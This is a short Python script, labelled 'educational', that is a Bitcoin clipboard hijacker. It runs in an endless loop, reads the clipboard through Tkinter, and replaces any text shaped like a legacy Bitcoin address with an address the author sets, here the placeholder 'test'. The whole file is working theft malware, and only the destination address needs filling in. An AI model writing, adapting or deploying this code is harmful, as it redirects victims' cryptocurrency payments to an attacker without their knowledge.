"""
author = Angelo Giacco
INTENDED FOR EDUCATIONAL PURPOSES ONLY
BITCOIN PAYMENT INTERCEPTOR
"""
destination_address = b"test"
try:
    import Tkinter as tk #2.x
except ImportError:
    import tkinter as tk #3.x

def get_clipboard():
    root = tk.Tk()
    root.withdraw()
    data = root.clipboard_get()
    change_clipboard(root,data)

def change_clipboard(r,d):
    if (len(d) >= 25 and len(d) <= 34) and d[0] == '1':
        r.clipboard_clear()
        r.clipboard_append(destination_address)
        r.update()
        r.destroy()

while True:
    get_clipboard()
